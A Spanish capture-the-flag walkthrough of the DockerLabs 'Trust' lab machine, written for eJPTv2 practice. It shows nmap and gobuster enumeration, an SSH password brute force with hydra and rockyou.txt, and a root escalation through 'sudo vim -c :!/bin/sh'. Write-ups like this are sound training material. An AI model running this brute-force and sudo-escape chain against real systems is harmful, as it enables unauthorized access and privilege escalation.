# Maquina Trust - DockerLabs

* Nivel : Muy Fácil
* Máquina : Linux
* Útil para el Ejptv2
* Ip Maquina : 172.18.0.2

Instalar y desplegar el docker con : sudo bash auto_deploy.sh trust.tar

## Escaneo de puertos

```bash
sudo nmap -A -sV -O -T4 -p- -Pn 172.18.0.2
```
```bash
Nmap scan report for 172.18.0.2
Host is up (0.000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:12:00:02 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=6/26%OT=22%CT=1%CU=37096%PV=Y%DS=1%DC=D%G=Y%M=0242A
OS:C%TM=685D2238%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10B%TI=Z%CI=Z%II
OS:=I%TS=A)SEQ(SP=FD%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O
OS:2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)
OS:WIN(W1=7C70%W2=7C70%W3=7C70%W4=7C70%W5=7C70%W6=7C70)ECN(R=Y%DF=Y%T=40%W=
OS:7D78%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
OS:T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0
OS:%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Estan abiertos los puertos 22 ssh y 80 http. 

## Escaneo web

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirb/big.txt -t 30 -x php,txt,htm
```
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,htm
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.htm        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.htm        (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```
Hay una ruta /secret.php . Dentro hay un mensaje, que nos da un nombre Mario. Con el que voy a intentar entrar al ssh con hydra.

## SSH - Hydra

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt -t 4 172.18.0.2 ssh
```
```bash
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```
El hydra a encontrado la password chocolate

Entrar con el user mario.

```bash
ssh mario@172.18.0.2 
```
Hacer un sudo -l para ver si mario tiene algún permiso para ejecutrar algún comando como root.
```bash
mario@085a3346ac1b:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 085a3346ac1b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 085a3346ac1b:
    (ALL) /usr/bin/vim

```
Mario puede usar el vim con permisos de root, entonces buscar alguna vulnerabilidad con el sudo para escalar a root, uso la web GTFobins

```bash
mario@085a3346ac1b:~$ sudo /usr/bin/vim -c ':!/bin/sh'

# whoami
root

```
He encontrado este comando para ser root. Y ya esta.


